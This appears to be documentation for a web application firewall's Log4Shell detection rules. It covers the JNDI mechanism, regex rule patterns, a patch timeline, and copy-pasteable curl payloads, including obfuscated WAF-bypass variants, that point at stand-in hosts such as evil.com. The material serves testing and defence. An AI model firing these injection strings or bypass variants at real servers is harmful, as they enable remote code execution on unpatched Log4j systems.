# Log4Shell

## CVE-2021-44228 — What it is

Log4Shell is a critical remote code execution vulnerability in Apache Log4j 2 (versions 2.0-beta9 through 2.14.1, patched in 2.15.0). It was disclosed in December 2021 and has a CVSS score of 10.0.

Log4j's message lookup feature allows substitution of variable expressions like `${env:HOME}` in log messages. When Log4j logs a string containing `${jndi:ldap://attacker.com/a}`, it makes an outbound LDAP request to the attacker-controlled server. The LDAP server responds with a reference to a Java class that is downloaded and instantiated on the vulnerable server, giving the attacker code execution.

---

## How JNDI works

JNDI (Java Naming and Directory Interface) is a Java API for directory lookups. Log4j 2 implements a lookup provider that resolves `${jndi:<scheme>://<host>/<path>}`:

1. The application logs any string from user input (a User-Agent, form field, HTTP header value).
2. Log4j sees `${jndi:ldap://evil.com/a}` in the string.
3. Log4j makes an outbound TCP connection to `evil.com:389` (LDAP).
4. The LDAP server returns a `javaCodeBase` reference pointing to `http://evil.com/Exploit.class`.
5. Log4j's JVM downloads and loads `Exploit.class`.
6. The static initializer of `Exploit.class` runs — RCE achieved.

Supported JNDI protocols used by attackers:
- `ldap://` and `ldaps://` (most common)
- `rmi://` (Java RMI)
- `dns://` (used for out-of-band detection)
- `iiop://`, `corba://`, `nds://` (less common)

---

## Why all headers are scanned

Attackers inject JNDI strings into any value that a Java application might log. Standard practice is to log request details for debugging, including:

- `User-Agent`
- `X-Forwarded-For`
- `X-Api-Version`
- `X-Request-Id`
- Arbitrary custom headers

The WAF scans **every header value** — not just well-known ones — using the same `deepDecode` preprocessing applied to query params and body fields.

---

## All 6 rules

| Rule ID | Pattern | Example payload |
|---------|---------|-----------------|
| `log4shell-jndi` | `${jndi:` | `${jndi:ldap://evil.com/a}` |
| `log4shell-jndi-ldap` | `${jndi:(ldap\|ldaps\|rmi\|dns\|iiop\|corba\|nds\|http)://` | `${jndi:rmi://evil.com:1099/exploit}` |
| `log4shell-obfuscated-lower` | `${.*lower.*j.*ndi` / `j${.*}ndi` | `${${lower:j}ndi:ldap://evil.com/a}` |
| `log4shell-obfuscated-upper` | `${.*upper.*j.*ndi` | `${${upper:j}ndi:ldap://evil.com/a}` |
| `log4shell-double-colon` | `${::-j}` | `${::-j}${::-n}${::-d}${::-i}:ldap://evil.com/a` |
| `log4shell-nested` | Nested `${...}` containing `jndi` | `${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://evil.com/a}` |

---

## Example payloads (copy-pasteable)

**Basic injection via User-Agent:**
```bash
curl -H 'User-Agent: ${jndi:ldap://evil.com/a}' http://localhost:3000/
```

**RMI protocol:**
```bash
curl -H 'User-Agent: ${jndi:rmi://evil.com:1099/exploit}' http://localhost:3000/
```

**DNS out-of-band detection:**
```bash
curl -H 'X-Api-Version: ${jndi:dns://burpcollaborator.net/test}' http://localhost:3000/
```

**Obfuscated — lower: bypass attempt:**
```bash
curl -H 'User-Agent: ${${lower:j}ndi:ldap://evil.com/a}' http://localhost:3000/
```

**Obfuscated — upper: bypass attempt:**
```bash
curl -H 'X-Forwarded-For: ${${upper:j}ndi:ldap://evil.com/a}' http://localhost:3000/
```

**Double-colon bypass:**
```bash
curl -H 'User-Agent: ${::-j}${::-n}${::-d}${::-i}:ldap://evil.com/a' http://localhost:3000/
```

**Nested expression — maximum obfuscation:**
```bash
curl -H 'X-Custom-Header: ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://evil.com/a}' http://localhost:3000/
```

All of these return `403 Forbidden`.

---

## Obfuscation variants explained

Log4j supports nested lookups. `${lower:j}` returns `j`, so `${${lower:j}ndi:...}` resolves to `${jndi:...}`. Attackers use this to bypass WAFs that only look for the literal string `jndi`.

Common obfuscation techniques:

| Technique | Example |
|-----------|---------|
| `${lower:X}` | `${lower:j}` → `j` |
| `${upper:X}` | `${upper:j}` → `J` (Log4j is case-insensitive) |
| `${::-X}` | `${::-j}` → `j` |
| Nested substitutions | `${${lower:${lower:j}}ndi:...}` |
| Mixed encoding | `${j${::-n}di:...}` |

The WAF applies `deepDecode()` preprocessing (multi-pass URL decode, HTML entity decode) before matching, and the regex patterns are written to match these variant forms directly.

---

## Affected versions and timeline

| Date | Event |
|------|-------|
| November 24, 2021 | Alibaba Cloud security team privately reports to Apache |
| December 9, 2021 | Exploit PoC published on GitHub; mass exploitation begins within hours |
| December 10, 2021 | CVE-2021-44228 assigned (CVSS 10.0); Log4j 2.15.0 released |
| December 14, 2021 | Bypass in 2.15.0 found (CVE-2021-45046); 2.16.0 released |
| December 18, 2021 | Denial-of-service in 2.16.0 (CVE-2021-45105); 2.17.0 released |

**Affected:** Log4j 2.0-beta9 through 2.14.1 (CVE-2021-44228), 2.15.0 (CVE-2021-45046), 2.16.0 (CVE-2021-45105).
**Safe:** Log4j 2.17.0+, Log4j 1.x (different codebase, no JNDI lookup).

The WAF detects the payload in the HTTP request regardless of what Log4j version the backend uses.
